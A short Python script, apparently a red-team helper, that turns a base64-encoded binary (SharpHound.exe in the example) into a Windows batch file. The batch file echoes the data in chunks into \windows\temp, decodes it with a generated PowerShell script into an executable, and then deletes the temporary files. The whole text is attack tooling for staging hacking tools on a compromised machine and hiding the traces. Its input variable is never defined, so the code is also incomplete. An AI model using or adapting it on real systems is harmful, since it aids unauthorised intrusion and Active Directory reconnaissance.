### convert file to be uploaded in base64 first. cat file | base64 -w 0
### Below example upload SharpHound.exe
echo_split_size = 7000  ## the string is split in smaller string of this size to be echoed
output_bat = 'sharp.bat'  ## Output batch script file
window_tmp_folder = r'\windows\temp'  ## Windows writable dir for storing temp files
window_exe_path = r'\windows\temp\sharp.exe' ## Output upload path

import string
import random
unique_len = 5  ## Random suffix for temp files
suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k = unique_len))

### set of commands to store b64string to a temp file
with open(output_bat, "w") as f:
	f.write("echo {} > {}\\file{}.txt\n".format(convb64tring[:echo_split_size],window_tmp_folder,suffix))
	next_ind = echo_split_size
	while next_ind < len(convb64tring):
		if len(convb64tring) - next_ind >= echo_split_size:
			f.write("echo {} >> {}\\file{}.txt\n".format(convb64tring[next_ind:next_ind+echo_split_size],window_tmp_folder,suffix))
		else:
			f.write("echo {} >> {}\\file{}.txt\n".format(convb64tring[next_ind:],window_tmp_folder,suffix))
		next_ind += echo_split_size
	###generate Powershell b64convert
	f.write("echo $base64string = gc -raw {}\\file{}.txt > {}\\file{}.ps1\n".format(window_tmp_folder,suffix,window_tmp_folder, suffix))
	f.write("echo [IO.File]::WriteAllBytes(\"{}\", [Convert]::FromBase64String($base64string.replace(\"`n\",\"\"))) >> {}\\\\file{}.ps1\n".format(window_exe_path,window_tmp_folder,suffix))
	f.write("powershell.exe {}\\file{}.ps1\n".format(window_tmp_folder,suffix))
	###clean up
	f.write("del {}\\file{}.txt\n".format(window_tmp_folder,suffix))
	f.write("del {}\\file{}.ps1\n".format(window_tmp_folder,suffix))